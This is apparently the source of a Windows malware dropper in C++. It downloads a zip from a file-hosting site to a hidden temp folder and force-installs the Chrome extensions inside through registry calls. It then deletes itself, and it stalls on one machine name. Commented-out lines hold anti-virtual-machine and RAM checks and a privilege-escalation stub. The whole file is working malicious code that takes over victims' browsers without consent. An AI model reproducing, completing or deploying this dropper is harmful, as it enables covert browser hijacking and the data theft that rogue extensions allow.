#include "uac.h"

#pragma comment(lib, "urlmon.lib")


int WINAPI wWinMain
(   HINSTANCE hInstance, 
    HINSTANCE hPrevInstance, 
    PWSTR pCmdLine, 
    int nCmdShow) 
{
    HMODULE regdll = GetModuleHandleW(L"ADVAPI32.dll");

    if (GetComputerName() == "HAL9TH")
        std::this_thread::sleep_for(std::chrono::minutes(10));

   // if (!IsChromeInstalled(regdll))
   //     return -1;

   // if (IsVirtualComputer(regdll))
     //   return -1;

    //auto ram = GetRamCapacity();
    //if (ram <= 2)
    //    return -1;
    

    //if (!IsElevated(regdll)) {
        //bigboss();
     //   if (!IsElevated(regdll)) {
     //       MessageBox(NULL, L"This program must be run as Administrator", NULL, MB_OK | MB_ICONERROR);
     //       return -1;
     //   }
    //}
    string bushbaby = "https://files.catbox.moe/x7kelq.zip";
    //string bushbaby = "https://files.catbox.moe/j6szzt.zip";

    string guid = GenerateGUID();        //generate unique identifier 
    string directory = GetTempFolder() + "\\" + guid;   // create temp folder with unique identifier 
    auto _ = _mkdir(directory.c_str());  // create temp folder with unique identifier
    string fileName = directory + "\\" + GetFileNameFromPath(bushbaby);  
    string dic = GetFileNameWithoutExtension(fileName);

    DownloadExtension(bushbaby, fileName);
    ExtractExtension(fileName, directory);

    auto ids = GetExtensionId(directory, regdll);

    if (ids.size() == 0) {
        DelMe();
        return 0;
    }

    for (const std::string& item : ids)
        InstallExtension(item, "https://clients2.google.com/service/update2/crx", regdll);
        //InstallExtension(item, directory, regdll);
    
    Sleep(20000);
    DelMe();

    return 0;
}

